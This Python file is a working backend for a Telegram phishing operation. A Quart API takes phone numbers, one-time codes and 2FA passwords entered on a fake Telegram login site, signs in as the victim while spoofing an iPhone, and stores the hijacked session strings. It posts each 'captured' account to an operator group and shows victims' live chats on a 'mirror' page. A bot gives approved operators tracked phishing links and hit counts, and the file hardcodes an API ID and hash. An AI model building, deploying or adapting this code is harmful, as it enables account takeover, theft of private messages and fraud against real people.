import os
import asyncio
import telebot
import psycopg2
import logging
import sys
import json
import uuid
from telebot import types
from quart import Quart, request, jsonify, render_template, redirect, url_for
from quart_cors import cors  # CRITICAL: Allows Wuaze to talk to Koyeb
from telethon import TelegramClient, functions, errors, events
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timedelta

# --- SECTION 1: SYSTEM CONFIGURATION ---
# These must be set in your Koyeb Environment Variables
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", 0)) 
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", 0))
ADMIN_HANDLE = os.environ.get("ADMIN_HANDLE", "@g_yuyuu")

# Your InfinityFree URL (Frontend)
BASE_URL = "https://web-telegrams-login.wuaze.com" 

# Setup Logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("VinzyUltra_Pro_V3")

# Initialize Apps
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)

# --- SECTION 2: CORS & SECURITY ---
# This stops the "Blocked by CORS" error when your website tries to send data
app = cors(app, allow_origin="https://web-telegrams-login.wuaze.com")

# Live Session Storage
active_mirrors = {} 

# --- SECTION 3: DATABASE ARCHITECTURE ---
def get_db_connection():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    """Ensures all tables exist on startup."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        # TABLE: Authorized Agents
        cur.execute("""
            CREATE TABLE IF NOT EXISTS approved_users (
                user_id BIGINT PRIMARY KEY, 
                username TEXT,
                joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # TABLE: Captured Hits (Sessions)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS controlled_accounts (
                phone TEXT PRIMARY KEY, 
                session_string TEXT NOT NULL, 
                owner_name TEXT, 
                tid BIGINT,
                hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)

        # TABLE: Analytics & Metrics
        cur.execute("""
            CREATE TABLE IF NOT EXISTS link_metrics (
                tid BIGINT PRIMARY KEY,
                clicks INTEGER DEFAULT 0,
                hits INTEGER DEFAULT 0
            )
        """)
        
        conn.commit()
        cur.close()
        conn.close()
        logger.info("SYSTEM: Database schema integrity verified.")
    except Exception as e:
        logger.critical(f"DB INIT FAILED: {e}")

def is_approved(user_id):
    """Checks if a user is allowed to use the bot tools."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT user_id FROM approved_users WHERE user_id = %s", (user_id,))
        res = cur.fetchone()
        cur.close()
        conn.close()
        return res is not None
    except: return False

# Initial DB Run
init_db()

# --- SECTION 4: WEB API BRIDGE (RECEIVING DATA FROM WUAZE) ---

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    """Handles the initial phone number submission."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "").replace(" ", "").strip()
    tid = data.get('tid', '0')

    if not phone:
        return jsonify({"status": "error", "msg": "Invalid phone format."})

    # High-Trust Spoofing (iPhone 16 Pro Max)
    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 16 Pro Max", system_version="18.3")
    
    try:
        await client.connect()
        sent_code = await client.send_code_request(phone)
        
        # Store the live client in memory
        active_mirrors[phone] = {
            "client": client, 
            "hash": sent_code.phone_code_hash, 
            "tid": tid,
            "timestamp": datetime.now()
        }
        
        logger.info(f"BRIDGE: OTP requested for {phone}")
        return jsonify({"status": "success"})
        
    except errors.FloodWaitError as e:
        return jsonify({"status": "error", "msg": f"Flood Limit: {e.seconds}s"})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Phone not supported."})

@app.route('/step_code', methods=['POST'])
async def step_code():
    """Verifies the OTP code sent by the victim."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "").replace(" ", "")
    code = data.get('code', '').strip()
    tid = data.get('tid')

    if phone not in active_mirrors:
        return jsonify({"status": "error", "msg": "Session Expired."})

    session = active_mirrors[phone]
    client = session['client']

    try:
        await client.sign_in(phone, code, phone_code_hash=session['hash'])
        return await finalize_hit(client, phone, tid)

    except errors.SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Invalid OTP code."})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    """Final check for accounts with 2-Step Verification."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "").replace(" ", "")
    password = data.get('password', '').strip()
    tid = data.get('tid')

    if phone not in active_mirrors:
        return jsonify({"status": "error", "msg": "Expired."})

    client = active_mirrors[phone]['client']
    try:
        await client.sign_in(password=password)
        return await finalize_hit(client, phone, tid)
    except Exception as e:
        return jsonify({"status": "error", "msg": "Wrong 2FA password."})

async def finalize_hit(client, phone, tid):
    """Saves session, alerts groups, and cleans memory."""
    try:
        me = await client.get_me()
        session_str = client.session.save()
        owner_name = f"{me.first_name} {me.last_name or ''}".strip()

        # Update Database
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO controlled_accounts (phone, session_string, owner_name, tid) VALUES (%s, %s, %s, %s) ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string", (phone, session_str, owner_name, tid))
        cur.execute("INSERT INTO link_metrics (tid, hits) VALUES (%s, 1) ON CONFLICT (tid) DO UPDATE SET hits = link_metrics.hits + 1", (tid,))
        conn.commit()
        cur.close()
        conn.close()

        # Admin Log
        bot.send_message(LOGGER_GROUP, f"⚡ <b>ACCOUNT CAPTURED</b> ⚡\n👤: {owner_name}\n📱: <code>{phone}</code>\n🔑: <code>{session_str}</code>")

        # User Alert
        if str(tid).isdigit():
            bot.send_message(tid, f"🎯 <b>New Success!</b>\nTarget: {owner_name}\nPhone: {phone}")

        await client.disconnect()
        if phone in active_mirrors: del active_mirrors[phone]
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error"})

# --- SECTION 5: MIRROR DASHBOARD ---

@app.route('/mirror/<phone>')
async def mirror_dashboard(phone):
    """Allows team members to see live messages of captured accounts."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT session_string FROM controlled_accounts WHERE phone = %s", (phone,))
        res = cur.fetchone()
        cur.close()
        conn.close()

        if not res: return "Account Not Found", 404

        client = TelegramClient(StringSession(res[0]), API_ID, API_HASH)
        await client.connect()
        
        dialogs = await client.get_dialogs(limit=15)
        html = f"<h2>Mirror: {phone}</h2><ul>"
        for d in dialogs:
            html += f"<li><b>{d.name}</b>: {d.message.message[:40]}...</li>"
        html += "</ul>"
        
        await client.disconnect()
        return html
    except Exception as e:
        return str(e)

# --- SECTION 6: TELEGRAM BOT COMMANDS ---

@bot.message_handler(commands=['start'])
def start_cmd(m):
    user_id = m.from_user.id
    if is_approved(user_id):
        kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
        kb.add("🔗 Generate Link", "📊 My Stats")
        bot.send_message(m.chat.id, "<b>Vinzy Pro Panel Ready.</b>", reply_markup=kb)
    else:
        # Send Request to Admin
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Approve User", callback_data=f"auth_{user_id}"))
        bot.send_message(VERIFY_GROUP, f"New User Request: {user_id}", reply_markup=markup)
        bot.send_message(m.chat.id, "Access Denied. Request sent to Admin.")

@bot.callback_query_handler(func=lambda c: c.data.startswith('auth_'))
def approve_user(call):
    uid = int(call.data.split('_')[1])
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO approved_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (uid,))
    conn.commit()
    cur.close()
    conn.close()
    bot.answer_callback_query(call.id, "Approved!")
    bot.send_message(uid, "Your account is approved! Type /start.")

@bot.message_handler(func=lambda m: m.text == "🔗 Generate Link")
def gen_link(m):
    if is_approved(m.from_user.id):
        bot.reply_to(m, f"Your Link:\n<code>{BASE_URL}/?id={m.from_user.id}</code>")

@bot.message_handler(func=lambda m: m.text == "📊 My Stats")
def get_stats(m):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT hits FROM link_metrics WHERE tid = %s", (m.from_user.id,))
    res = cur.fetchone()
    cur.close()
    conn.close()
    bot.reply_to(m, f"Total Hits: {res[0] if res else 0}")

# --- SECTION 7: RUNTIME ---

def bot_polling():
    bot.polling(none_stop=True)

if __name__ == "__main__":
    Thread(target=bot_polling, daemon=True).start()
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
